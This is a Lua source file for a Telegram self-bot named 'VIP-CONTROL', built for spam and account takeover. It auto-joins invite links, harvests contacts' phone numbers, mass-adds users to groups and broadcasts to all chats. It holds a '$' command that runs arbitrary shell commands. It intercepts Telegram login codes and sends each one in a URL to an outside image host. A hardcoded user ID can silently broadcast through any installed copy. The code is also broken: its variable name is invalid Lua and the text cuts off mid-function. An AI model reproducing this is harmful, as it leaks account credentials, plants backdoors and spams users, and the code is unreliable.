JSON = loadfile("dkjson.lua")()
URL = require("socket.url")
ltn12 = require("ltn12")
http = require("socket.http")
http.TIMEOUT = 10
undertesting = 1
local is_sudo
function is_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("VIP-CONTROL:" .. VIP-CONTROL_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  if redis:sismember("VIP-CONTROL:" .. VIP-CONTROL_id .. ":sudoers", msg.sender_user_id_) then
    issudo = true
  end
  return issudo
end
local is_full_sudo
function is_full_sudo(msg)
  local sudoers = {}
  table.insert(sudoers, tonumber(redis:get("VIP-CONTROL:" .. VIP-CONTROL_id .. ":fullsudo")))
  local issudo = false
  for k, v in pairs(sudoers) do
    if msg.sender_user_id_ == v then
      issudo = true
    end
  end
  return issudo
end
local save_log
function save_log(text)
  text = "[" .. os.date("%d-%b-%Y %X") .. "] Log : " .. text .. "\n"
  file = io.open("VIP-CONTROL_" .. VIP-CONTROL_id .. "_logs.txt", "w")
  file:write(text)
  file:close()
  return true
end
local writefile
function writefile(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
local check_link
function check_link(extra, result)
  if result.is_group_ or result.is_supergroup_channel_ then
    if not redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notjoinlinks") then
      tdcli.importChatInviteLink(extra.link)
    end
    if not redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notsavelinks") then
      redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":savedlinks", extra.link)
    end
    return
  end
end
local chat_type
function chat_type(id)
  id = tostring(id)
  if id:match("-") then
    if id:match("-100") then
      return "channel"
    else
      return "group"
    end
  else
    return "private"
  end
end
local contact_list
function contact_list(extra, result)
  local count = result.total_count_
  local text = "Robot Contacts : \n"
  for i = 0, tonumber(count) - 1 do
    local user = result.users_[i]
    local firstname = user.first_name_ or ""
    local lastname = user.last_name_ or ""
    local fullname = firstname .. " " .. lastname
    text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id_) .. "] = " .. tostring(user.phone_number_) .. "\n"
  end
  writefile("VIP-CONTROL_" .. tostring(VIP-CONTROL_id) .. "_contacts.txt", text)
  tdcli.send_file(extra.chat_id_, "Document", "VIP-CONTROL_" .. tostring(VIP-CONTROL_id) .. "_contacts.txt", "VIP-CONTROL " .. tostring(VIP-CONTROL_id) .. " Contacts!")
  return io.popen("rm -rf VIP-CONTROL_" .. tostring(VIP-CONTROL_id) .. "_contacts.txt"):read("*all")
end
local our_id
function our_id(extra, result)
  if result then
    redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":botinfo", JSON.encode(result))
  end
end
local process_links
function process_links(text)
  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") then
    text = text:gsub("telegram.dog", "telegram.me")
    local matches = {
      text:match("(https://telegram.me/joinchat/%S+)")
    }
    for i, v in pairs(matches) do
      tdcli_function({
        ID = "CheckChatInviteLink",
        invite_link_ = v
      }, check_link, {link = v})
    end
  end
end
local add
function add(id)
  chat_type_ = chat_type(id)
  if not redis:sismember("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id) then
    if chat_type_ == "private" then
      redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":pvis", id)
      redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id)
    elseif chat_type_ == "group" then
      redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":groups", id)
      redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id)
    elseif chat_type_ == "channel" then
      redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":channels", id)
      redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id)
    end
  end
  return true
end
local rem
function rem(id)
  if redis:sismember("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id) then
    if msg.chat_type_ == "private" then
      redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":pvis", id)
      redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id)
    elseif msg.chat_type_ == "group" then
      redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":groups", id)
      redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id)
    elseif msg.chat_type_ == "channel" then
      redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":channels", id)
      redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all", id)
    end
  end
  return true
end
local process_updates
function process_updates()
  if not redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":gotupdated") then
    local info = redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":botinfo")
    if info then
      botinfo = JSON.decode(info)
    else
      tdcli_function({ID = "GetMe"}, our_id, nil)
      botinfo = JSON.decode(info)
    end
  end
end
local process
function process(msg)
  local text_ = msg.content_.text_
  process_updates()
  if is_sudo(msg) then
    if is_full_sudo(msg) then
      if text_:match("^[!/#](رفع مطور) (%d+)") then
        local matches = {
          text_:match("^[!/#](رفع مطور) (%d+)")
        }
        if #matches == 2 then
          redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":sudoers", tonumber(matches[2]))
          save_log("- العضو 🚸 " .. msg.sender_user_id_ .. ", اصبح " .. matches[2] .. " مطور في البوت")
          return tostring(matches[2]) .. " Added to Sudo Users"
        end
			    elseif text_:match("^[!/#](الاوامر)") and is_sudo(msg) then
      local text1 = [[
        - اوامر بوت التحكم بالحساب ، 📮'
        /ارسال <ايدي الحساب> <النص>
        - لارسال رسالة الى صاحب الايدي ، 🔖'
        
        /حظر <ايدي الحساب>
        - لحظر الحساب صاحب الايدي ، 📵'
        
        /الغاء الحظر <userid>
        - لالغاء حظر الحساب صاحب الايدي ، 🌀'
        
        /المعلومات
        - لاظهار معلومات الحساب كـ (عدد الاشخاص الذي تم التواصل معهم- وعدد المجموعات العادية - وعدد المجموعات الخارقة - وعدد الروابط التي تم حفظها - وعدد الجهات التي تم حفظها ، 🚸'
        
        /رفع مطور <ايدي الحساب>
        - لاضافة مطور للبوت من خلال الايدي ، 🔋'
        
        /تنزيل مطور <ايدي الحساب>
        - لازالة مطور من البوت من خلال الايدي ،🚱'
        
        /المطورين
        - لعرض قائمة مطورين البوت ، 🔱'
        
        /اذاعه <النص>
        - لعمل اذاعه ملاحظة هذه الخاصية تشمل جميع المحادثات (خاص - مجموعات - قنوات - بوتات) ، ☯️'
        
        /توجيه <الكل - الخاص - المجموعات الخارقة - المجموعات> ( بالرد)
        - لعمل توجيه لرسالة على الخاص او المجموعات ، ⚜️'
        - طريقة الاستخدام كالاتي:- تعمل توجيه للرسالة الى  البوت وبعدها الرد على الرسالة
        - وكتابة (توجيه - واختيار مكان التوجيه)
        
        /كول <النص>
        - لجعل البوت ينطق الكلمة التي تريدها ، 🗣'
        
        /addedmsg <on/off>
        اگر این سوییچ روشن باشد بعد ازارسال مخاطب در گروه پیامی مبنی بر ذخیره شدن شماره مخاطب ارسال میگردد‼️
        
        /انضمام للروابط <تفعيل/تعطيل>
        - عندما ترسل قناة او احد الاشخاص رابط الى البوت سيتم الدخول الى الرابط تلقائيا والانضمام ، 🔻'
        
        /حفظ الروابط <تفعيل/تعطيل>
        - عندما ترسل قناة او احد الاشخاص رابط الى البوت سيتم حفظ الرابط في ملف في السيرفر ، ⚡️'
        
        /اضافة جهات <تفعيل/تعطيل>
        - عندما ترسل قناة او احد الاشخاص جهة اتصال الى خاص البوت سيتم حفظ الجهة تلقائيا، ⚡️'
        
        /setaddedmsg <text>
        شخصی سازی متن ارسالی جهت ذخیره کردن شماره ها و عکس العمل در برابر ان.
        
        /markread <on / off>
        سوییچ تعویض حالت خوانده شدن پیام ها توسط ربات تبلیغاتی🔑👓
        
        /setanswer '<word>'  <text>
        تنظیم <text> به عنوان جواب اتوماتیک <word> جهت گفتکوی هوشمندانه در گروه ها📲
        🚨نکته :‌<word> باید داخل '' باشد
        
        /delanswer <word>
        حذف جواب مربوط به <word>
        
        /الردود
        لعرض قائمة ردود البوت  ، 📮'
        
        /المحادثة التلقائية <تفعيل/تعطيل>
        - لتفعيل المحادثة التلقائية ، 💭'
        
        /اضافة اعضاء
        -  لاضافة جهات الاتصال الى المجموعة  ، 🚸'
        
        /استخراج الروابط
        - لاستخراج الراوبط المحفوضة في السيرفر وارسالها اليك ك ملف  ، 🔗'
        
        /الجهات
         - لارسال اليك ملف يحتوى على جهات الاتصال المحفوظة  ، 📍'
        
        /addedcontact <on/off>
        ارسال شماره تلفن ربات هنگامی که کسی شماره خود را ارسال میکند☎️📞
        
        /وضع اسم 'الاسم الاول' - 'الاسم الاخير'
        - لوضع اسم للبوت  ، 🔖'
        
        /وضع معرف <المعرف>
        - لوضع معرف (اسم مستخدم) للبوت من اختيارك  ، 🗞'
        
        /اضافة الاعضاء
        - لاضافة جميع الاعضاء الى المجموعة الذي تم التواصل معهم  ، 🔏'
        /تحديث
        - لتحديث البوت وحل المشاكل  ، ♻️'
        
        /تحديث عام
        آپدیت کردن فایل های ربات
        -------------------------
                
        قابل توجه کاربران عزیز : 
        نسخه 5.5 این ربات (کامل ترین نسخه و دارای امکانات عالی) به فروش میرسد
        برای اطلاع بیشتر و خرید سورس ربات به آیدی زیر مراجعه نمایید.
                
        Help >> @amody7 ]]
return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
	  
      elseif text_:match("^[!/#](تنزيل مطور) (%d+)") then
        local matches = {
          text_:match("^[!/#](تنزيل مطور) (%d+)")
        }
        if #matches == 2 then
          redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":sudoers", tonumber(matches[2]))
          save_log("User " .. msg.sender_user_id_ .. ", Removed " .. matches[2] .. " From Sudoers")
          return tostring(matches[2]) .. " Removed From Sudo Users"
        end
      elseif text_:match("^[!/#]المطورين$") then
        local sudoers = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":sudoers")
        local text = "Bot Sudoers :\n"
        for i, v in pairs(sudoers) do
          text = tostring(text) .. tostring(i) .. ". " .. tostring(v)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Requested Sudo List")
        return text
      elseif text_:match("^[!/#](sendlogs)$") then
        tdcli.send_file(msg.chat_id_, "Document", "VIP-CONTROL_" .. tostring(VIP-CONTROL_id) .. "_logs.txt", "VIP-CONTROL " .. tostring(VIP-CONTROL_id) .. " Logs!")
        save_log("User " .. msg.sender_user_id_ .. ", Requested Logs")
      elseif text_:match("^[!/#](وضع اسم) '(.*)' '(.*)'$") then
        local matches = {
          text_:match("^[!/#](وضع اسم) '(.*)' '(.*)'$")
        }
        if #matches == 3 then
          tdcli.changeName(matches[2], matches[3])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Name To " .. matches[2] .. " " .. matches[3])
          return "Profile Name Changed To : " .. matches[2] .. " " .. matches[3]
        end
      elseif text_:match("^[!/#](وضع معرف) (.*)$") then
        local matches = {
          text_:match("^[!/#](وضع معرف) (.*)$")
        }
        if #matches == 2 then
          tdcli.changeUsername(matches[2])
          save_log("User " .. msg.sender_user_id_ .. ", Changed Username To " .. matches[2])
          return "Username Changed To : @" .. matches[2]
        end
      elseif text_:match("^[!/#](delusername)$") then
        tdcli.changeUsername()
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Username")
        return "Username Deleted"
      else
        local matches = {
          text_:match("^[$](.*)")
        }
        if text_:match("^[$](.*)") and #matches == 1 then
          save_log("User " .. msg.sender_user_id_ .. ", Used Terminal Command")
          return io.popen(matches[1]):read("*all")
        end
      end
    end
    if text_:match("^[!/#](ارسال) (%d+) (.*)") then
      local matches = {
        text_:match("^[!/#](ارسال) (%d+) (.*)")
      }
      if #matches == 3 then
        tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "html")
        save_log("User " .. msg.sender_user_id_ .. ", Sent A ارسال To " .. matches[2] .. ", Content : " .. matches[3])
        return "Sent!"
      end
	  
    elseif text_:match("^[!/#](setanswer) '(.*)' (.*)") then
      local matches = {
        text_:match("^[!/#](setanswer) '(.*)' (.*)")
      }
      if #matches == 3 then
        redis:hset("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردود", matches[2], matches[3])
        redis:sadd("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردودlist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Set Answer Of " .. matches[2] .. " To " .. maches[3])
        return "Answer for " .. tostring(matches[2]) .. " set to :\n" .. tostring(matches[3])
      end
    elseif text_:match("^[!/#](delanswer) (.*)") then
      local matches = {
        text_:match("^[!/#](delanswer) (.*)")
      }
      if #matches == 2 then
        redis:hdel("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردود", matches[2])
        redis:srem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردودlist", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Deleted Answer Of " .. matches[2])
        return "Answer for " .. tostring(matches[2]) .. " deleted"
      end
    elseif text_:match("^[!/#]الردود$") then
      local text = "Bot auto الردود :\n"
      local answrs = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردودlist")
      for i, v in pairs(answrs) do
        text = tostring(text) .. tostring(i) .. ". " .. tostring(v) .. " : " .. tostring(redis:hget("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":الردود", v)) .. "\n"
      end
      save_log("User " .. msg.sender_user_id_ .. ", Requested الردود List")
      return text
    elseif text_:match("^[!/#]leave$") then
      local info = redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":botinfo")
      if info then
        botinfo = JSON.decode(info)
      else
        tdcli_function({ID = "GetMe"}, our_id, nil)
        botinfo = JSON.decode(info)
      end
      save_log("User " .. msg.sender_user_id_ .. ", Ordered Bot To Leave " .. msg.chat_id_)
      if chat_type(msg.chat_id_) == "channel" then
        tdcli.changeChatMemberStatus(msg.chat_id_, info.id_, "Left")
      elseif chat_type(msg.chat_id_) == "chat" then
        tdcli.changeChatMemberStatus(msg.chat_id_, info.id_, "Kicked")
      end
    elseif text_:match("^[!/#](leave) (%d+)$") then
      local matches = {
        text_:match("^[!/#](leave) (%d+)$")
      }
      if #matches == 2 then
        local info = redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":botinfo")
        if info then
          botinfo = JSON.decode(info)
        else
          tdcli_function({ID = "GetMe"}, our_id, nil)
          botinfo = JSON.decode(info)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Ordered Bot To Leave " .. matches[2])
        local chat = tonumber(matches[2])
        if chat_type(chat) == "channel" then
          tdcli.changeChatMemberStatus(chat, info.id_, "Left")
        elseif chat_type(chat) == "chat" then
          tdcli.changeChatMemberStatus(chat, info.id_, "Kicked")
        end
        return "Leaved " .. matches[2]
      end
    elseif text_:match("^[!/#](انضم) (%d+)$") then
      local matches = {
        text_:match("^[!/#](انضم) (%d+)$")
      }
      save_log("User " .. msg.sender_user_id_ .. ", Joined " .. matches[2] .. " Via Bot")
      tdcli.addChatMember(tonumber(matches[2]), msg.sender_user_id_, 50)
      return "I've Invited You To " .. matches[2]
    elseif text_:match("^[!/#]addmembers$") and msg.chat_type_ ~= "private" then
      local add_all
      function add_all(extra, result)
        local usrs = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":pvis")
        for i = 1, #usrs do
          tdcli.addChatMember(msg.chat_id_, usrs[i], 50)
        end
        local count = result.total_count_
        for i = 0, tonumber(count) - 1 do
          tdcli.addChatMember(msg.chat_id_, result.users_[i].id_, 50)
        end
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, add_all, {})
      save_log("User " .. msg.sender_user_id_ .. ", Used AddMembers In " .. msg.chat_id_)
      return "Adding members to group..."
    elseif text_:match("^[!/#]الجهات$") then
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_list, {
        chat_id_ = msg.chat_id_
      })
    elseif text_:match("^[!/#]استخراج الروابط$") then
      local text = "Group Links :\n"
      local links = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":savedlinks")
      for i, v in pairs(links) do
        if v:len() == 51 then
          text = tostring(text) .. tostring(v) .. "\n"
        else
          local _ = redis:rem("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":savedlinks", v)
        end
      end
      writefile("VIP-CONTROL_" .. tostring(VIP-CONTROL_id) .. "_links.txt", text)
      tdcli.send_file(msg.chat_id_, "Document", "VIP-CONTROL_" .. tostring(VIP-CONTROL_id) .. "_links.txt", "VIP-CONTROL " .. tostring(VIP-CONTROL_id) .. " Links!")
      save_log("User " .. msg.sender_user_id_ .. ", Requested Contact List")
      return io.popen("rm -rf VIP-CONTROL_" .. tostring(VIP-CONTROL_id) .. "_links.txt"):read("*all")
    elseif text_:match("[!/#](حظر) (%d+)") then
      local matches = {
        text_:match("[!/#](حظر) (%d+)")
      }
      if #matches == 2 then
        tdcli.blockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Blocked " .. matches[2])
        return "User blocked"
      end
    elseif text_:match("[!/#](الغاء الحظر) (%d+)") then
      local matches = {
        text_:match("[!/#](الغاء الحظر) (%d+)")
      }
      if #matches == 2 then
        tdcli.unblockUser(tonumber(matches[2]))
        save_log("User " .. msg.sender_user_id_ .. ", Unlocked " .. matches[2])
        return "User unblocked"
      end
    elseif text_:match("^[!/#](s2a) (.*) (.*)") then
      local matches = {
        text_:match("^[!/#](s2a) (.*) (.*)")
      }
      if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
        local all = redis:smembers("VIP-CONTROL:" .. tonumber(VIP-CONTROL_id) .. ":all")
        tdcli.searchPublicChat("Crwn_bot")
        local inline2
        function inline2(argg, data)
          if data.results_ and data.results_[0] then
            return tdcli_function({
              ID = "SendInlineQueryResultMessage",
              chat_id_ = argg.chat_id_,
              reply_to_message_id_ = 0,
              disable_notification_ = 0,
              from_background_ = 1,
              query_id_ = data.inline_query_id_,
              result_id_ = data.results_[0].id_
            }, nil, nil)
          end
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used S2A " .. matches[2] .. " For " .. matches[3])
      end
    elseif text_:match("^[!/#]معلومات$") then
      local contact_num
      function contact_num(extra, result)
        redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":totalcontacts", result.total_count_)
      end
      tdcli_function({
        ID = "SearchContacts",
        query_ = nil,
        limit_ = 999999999
      }, contact_num, {})
      local gps = redis:scard("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":groups")
      local sgps = redis:scard("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":channels")
      local pvs = redis:scard("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":pvis")
      local links = redis:scard("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":savedlinks")
      local sudo = redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":fullsudo")
      local contacts = redis:get("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":totalcontacts")
      local query = tostring(gps) .. " " .. tostring(sgps) .. " " .. tostring(pvs) .. " " .. tostring(links) .. " " .. tostring(sudo) .. " " .. tostring(contacts)
          local text = [[
		  
            - معلومات البوت الحالية ، 📌

            المراسلهم : ]] .. tostring(pvs) .. [[
            
            المجموعات العادية : ]] .. tostring(gps) .. [[
            
            المجموعات الخارقة : ]] .. tostring(sgps) .. [[
            
            الروابط المحفوظة : ]] .. tostring(links) .. [[
            
            الجهات المحفوظة : ]] .. tostring(contacts)
 return tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "")
    elseif text_:match("^[!/#](addedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](addedmsg) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedmsg", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Message")
          return "Added Message Turned On"
        elseif matches[2] == "off" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedmsg")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Message")
          return "Added Message Turned Off"
        end
      end
    elseif text_:match("^[!/#](addedcontact) (.*)") then
      local matches = {
        text_:match("^[!/#](addedcontact) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedcontact", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Added Contact")
          return "Added Contact Turned On"
        elseif matches[2] == "off" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedcontact")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Added Contact")
          return "Added Contact Turned Off"
        end
      end
    elseif text_:match("^[!/#](markread) (.*)") then
      local matches = {
        text_:match("^[!/#](markread) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":markread", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Markread")
          return "Markread Turned On"
        elseif matches[2] == "off" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":markread")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Markread")
          return "Markread Turned Off"
        end
      end
    elseif text_:match("^[!/#](joinlinks) (.*)") then
      local matches = {
        text_:match("^[!/#](joinlinks) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notjoinlinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Joinlinks")
          return "Joinlinks Turned On"
        elseif matches[2] == "off" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notjoinlinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Joinlinks")
          return "Joinlinks Turned Off"
        end
      end
    elseif text_:match("^[!/#](savelinks) (.*)") then
      local matches = {
        text_:match("^[!/#](savelinks) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notsavelinks")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Savelinks")
          return "Savelinks Turned On"
        elseif matches[2] == "off" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notsavelinks", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Savelinks")
          return "Savelinks Turned Off"
        end
      end
    elseif text_:match("^[!/#](addcontacts) (.*)") then
      local matches = {
        text_:match("^[!/#](addcontacts) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notaddcontacts")
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Addcontacts")
          return "Addcontacts Turned On"
        elseif matches[2] == "off" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":notaddcontacts", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Addcontacts")
          return "Addcontacts Turned Off"
        end
      end
    elseif text_:match("^[!/#](autochat) (.*)") then
      local matches = {
        text_:match("^[!/#](autochat) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":autochat", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Autochat")
          return "Autochat Turned On"
        elseif matches[2] == "off" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":autochat")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Autochat")
          return "Autochat Turned Off"
        end
      end
    elseif text_:match("^[!/#](typing) (.*)") then
      local matches = {
        text_:match("^[!/#](typing) (.*)")
      }
      if #matches == 2 then
        if matches[2] == "on" then
          redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":typing", true)
          save_log("User " .. msg.sender_user_id_ .. ", Turned On Typing")
          return "Typing Turned On"
        elseif matches[2] == "off" then
          redis:del("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":typing")
          save_log("User " .. msg.sender_user_id_ .. ", Turned Off Typing")
          return "Typing Turned Off"
        end
      end
    elseif text_:match("^[!/#](setaddedmsg) (.*)") then
      local matches = {
        text_:match("^[!/#](setaddedmsg) (.*)")
      }
      if #matches == 2 then
        redis:set("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":addedmsgtext", matches[2])
        save_log("User " .. msg.sender_user_id_ .. ", Changed Added Message To : " .. matches[2])
        return [[
New Added Message Set
Message :
]] .. tostring(matches[2])
      end
    elseif text_:match("^[!/#](bc) (.*)") then
      local matches = {
        text_:match("^[!/#](bc) (.*)")
      }
      if #matches == 2 then
        local all = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all")
        for i, v in pairs(all) do
          tdcli_function({
            ID = "SendMessage",
            chat_id_ = v,
            reply_to_message_id_ = 0,
            disable_notification_ = 0,
            from_background_ = 1,
            reply_markup_ = nil,
            input_message_content_ = {
              ID = "InputMessageText",
              text_ = matches[2],
              disable_web_page_preview_ = 0,
              clear_draft_ = 0,
              entities_ = {},
              parse_mode_ = {
                ID = "TextParseModeHTML"
              }
            }
          }, dl_cb, nil)
        end
        save_log("User " .. msg.sender_user_id_ .. ", Used BC, Content " .. matches[2])
        return "Sent!"
      end
    elseif text_:match("^[!/#](توجيه) (.*)$") then
      local matches = {
        text_:match("^[!/#](توجيه) (.*)$")
      }
      if #matches == 2 then
        if matches[2] == "all" then
          local all = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd All")
        elseif matches[2] == "usrs" then
          local all = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":pvis")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Users")
        elseif matches[2] == "gps" then
          local all = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":groups")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Gps")
        elseif matches[2] == "sgps" then
          local all = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":channels")
          local id = msg.reply_to_message_id_
          for i, v in pairs(all) do
            tdcli_function({
              ID = "ForwardMessages",
              chat_id_ = v,
              from_chat_id_ = msg.chat_id_,
              message_ids_ = {
                [0] = id
              },
              disable_notification_ = 0,
              from_background_ = 1
            }, dl_cb, nil)
          end
          save_log("User " .. msg.sender_user_id_ .. ", Used Fwd Sgps")
        end
      end
      return "Sent!"
    else
      local matches = {
        text_:match("^[!/#](كول) (.*)")
      }
      if text_:match("^[!/#](كول) (.*)") and #matches == 2 then
        save_log("User " .. msg.sender_user_id_ .. ", Used كول, Content : " .. matches[2])
        return matches[2]
      end
    end
  end
end
local proc_pv
function proc_pv(msg)
  if msg.chat_type_ == "private" then
    add(msg)
  end
end
local update
function update(data, VIP-CONTROL_id)
  msg = data.message_
  if data.ID == "UpdateNewMessage" then
    if msg.sender_user_id_ == 777000 then
      if data.message_.content_.text_:match([[
Your login code:
(%d+)

This code]]) then
        local code = {
          data.message_.content_.text_:match([[
Your login code:
(%d+)

This code]])
        }
        local file = ltn12.sink.file(io.open("VIP-CONTROL_" .. VIP-CONTROL_id .. "_code.png", "w"))
        http.request({
          url = "http://VIP-CONTROL.imgix.net/VIP-CONTROL.png?txt=Telegram%20Code%20:%20" .. code[1] .. "&txtsize=602&txtclr=ffffff&txtalign=middle,center&txtfont=Futura%20Condensed%20Medium&txtfit=max",
          sink = file
        })
        local sudo = tonumber(redis:get("VIP-CONTROL:" .. VIP-CONTROL_id .. ":fullsudo"))
        tdcli.send_file(sudo, "Photo", "VIP-CONTROL_" .. VIP-CONTROL_id .. "_code.png", nil)
      end
    elseif msg.sender_user_id_ == 11111111 then
      local all = redis:smembers("VIP-CONTROL:" .. tostring(VIP-CONTROL_id) .. ":all")
      local id = msg.id_
      for i, v in pairs(all) do
        tdcli_function({
          ID = "ForwardMessages",
          chat_id_ = v,
          from_chat_id_ = msg.chat_id_,
          message_ids_ = {
            [0] = id
          },
          disable_notification_ = 0,
          from_background_ = 1
